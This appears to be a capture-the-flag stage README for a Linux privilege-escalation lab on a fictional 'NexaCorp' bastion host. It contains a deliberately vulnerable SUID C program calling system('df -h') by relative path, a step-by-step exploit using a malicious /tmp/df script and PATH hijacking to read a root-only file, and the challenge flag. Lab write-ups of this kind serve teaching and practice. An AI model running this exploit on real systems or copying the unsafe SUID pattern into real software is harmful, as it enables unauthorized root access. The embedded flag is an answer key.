# Stage 7: Production Host Privilege Escalation

## Overview
- Category: Linux Security & Privilege Escalation (PrivEsc)
- Target: NexaCorp Production Bastion Host (`NEXA-ROOT-07`)
- SSH Service Port: 2227
- Initial Credentials: `player` / `password123`
- Difficulty: Medium-Hard
- Flag: `SHADOWNET{linux_a8eafa5848a204be0958d232f9e83ed9}`

## Description
Having compromised perimeter credentials, you gain access to an unprivileged SSH account (`player`) on a NexaCorp internal bastion server. Critical infrastructure secrets and the stage flag are stored inside `/root/flag.txt`, which is only readable by the `root` user (`chmod 600`).

Your goal is to perform local privilege escalation by enumerating system binaries, identifying misconfigurations or vulnerable SUID executables, and hijacking execution flow to obtain root privileges.

## Directory Structure
- `setup_privesc.sh`: Shell script used to configure the unprivileged user, root flag, and vulnerable SUID binary on Linux.
- `Dockerfile`: Container image packaging Ubuntu, OpenSSH server, and the challenge environment.
- `docker-compose.yml`: Compose specification mapping host port `2227:22`.
- `SOLUTION.md`: Quick reference exploitation guide.

## Running the Target Environment

### Using Docker Compose
Start the SSH bastion container:
```bash
docker compose -f stages/stage7-linux-security/docker-compose.yml up -d
```

Connect via SSH:
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2227 player@localhost
# Password: password123
```

To stop the container:
```bash
docker compose -f stages/stage7-linux-security/docker-compose.yml down
```

### Native Host Setup (Alternative)
If you want to install the challenge vector directly onto a local Linux VM:
```bash
sudo ./stages/stage7-linux-security/setup_privesc.sh
```

## Vulnerability Details
During setup, a maintenance binary is compiled and assigned SUID root permissions (`chmod 4755 /usr/local/bin/nexa-backup`):

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    setuid(0);
    setgid(0);
    printf("=== NexaCorp Core Infrastructure System Maintenance Utility ===\n");
    printf("[*] Synchronizing system disk metrics...\n");
    // Relative PATH call without absolute path
    system("df -h");
    return 0;
}
```

Because `system("df -h")` does not specify an absolute path (such as `/bin/df`), the operating system searches through directories listed in the current user's `$PATH` environment variable in order. Since the program runs with effective root permissions due to the SUID bit, an attacker can manipulate `$PATH` to execute an arbitrary executable named `df`.

## Exploitation Walkthrough

### 1. Enumerate SUID Executables
Inside the SSH session as `player`:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Output includes:
```text
/usr/local/bin/nexa-backup
```

### 2. Inspect the SUID Binary
Run `strings` to inspect hardcoded strings and commands:
```bash
strings /usr/local/bin/nexa-backup
```
Notice the command string:
```text
df -h
```
The binary calls `df` directly rather than `/bin/df`.

### 3. Hijack the PATH Variable
Create a malicious script named `df` in `/tmp` that reads `/root/flag.txt`:

```bash
# Create malicious script
cat << 'EOF' > /tmp/df
#!/bin/bash
/bin/cat /root/flag.txt
EOF

# Make it executable
chmod +x /tmp/df

# Prepend /tmp to PATH
export PATH=/tmp:$PATH
```

### 4. Trigger the Exploit
Execute the SUID maintenance binary:
```bash
/usr/local/bin/nexa-backup
```

Output:
```text
=== NexaCorp Core Infrastructure System Maintenance Utility ===
[*] Synchronizing system disk metrics...
SHADOWNET{linux_a8eafa5848a204be0958d232f9e83ed9}
```

Submit the flag string into the ShadowNet Command Deck.

